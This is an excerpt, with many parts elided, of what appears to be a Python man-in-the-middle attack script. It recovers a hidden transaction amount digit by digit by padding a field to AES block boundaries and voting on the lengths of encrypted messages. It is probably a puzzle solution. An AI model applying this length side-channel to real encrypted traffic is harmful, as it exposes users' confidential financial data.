...
def send_command(shared):
    ...
    global next_digit
    global last_digit
    global valid_digit_vote
    global invalid_digit_vote
    ...
    try:
        if cur_state == 0:
            ...
            # this is annoying
            offset = ((MAX_AMOUNT_LEN - cur_amount_len) + 73 if cur_amount_len < 2
                      else (MAX_AMOUNT_LEN - cur_amount_len) + 72)
            if last_digit:
                offset = (MAX_AMOUNT_LEN - cur_amount_len) + 73

            cur_account_name = str(cur_account) \
                .zfill(NUM_PREFIX_BLOCK * AES_BLOCK_SIZE + 1 - offset)
            ...
            if next_digit >= 10:
                if amount_detected[-1:] == '1':
                    # the last digit is probably 0
                    amount_detected = amount_detected[:-1] + '0'
                    cur_state = 0
                    valid_digit_vote = 0
                    invalid_digit_vote = 0
                    cur_length = float("inf")
                    ...
                    log("[MITM]: found so far: %s" % amount_detected)
                    log("[MITM]: re-sending new: %s" % json_command)
                else:
                    cur_state = 6
    ...
    if direction == CLIENT2SERVER:
        ...
        try:
            ...
            if cur_message == MESSAGE_ORDER:
                log("<- [%d] #vote = %d, last digit = %s <-" % (len(buff), valid_digit_vote, str(last_digit)))
                if cur_state == 0 or cur_state == 1:
                    ...
                    # cur_length = min(cur_length, len(buff))
                    #
                    # cur_recheck -= 1
                    # if cur_recheck == 0:
                    #     cur_recheck = NUM_RECHECK
                    #     cur_state = 3
                    cur_length = 149 if last_digit else 165
                    cur_state = 3
                    send_command(shared)
                elif cur_state == 3:
                    cur_recheck = NUM_RECHECK
                    ...
                    if len(buff) == 149 and not last_digit:
                        valid_digit_vote += 1
                    elif len(buff) >= 165 and last_digit:
                        valid_digit_vote += 1
                    else:
                        invalid_digit_vote += 1

                    threshold = NUM_VOTE + 4 if last_digit else NUM_VOTE
                    if cur_recheck == 0 or valid_digit_vote >= threshold\
                            or invalid_digit_vote >= NUM_RECHECK - threshold:
                        if valid_digit_vote >= threshold:
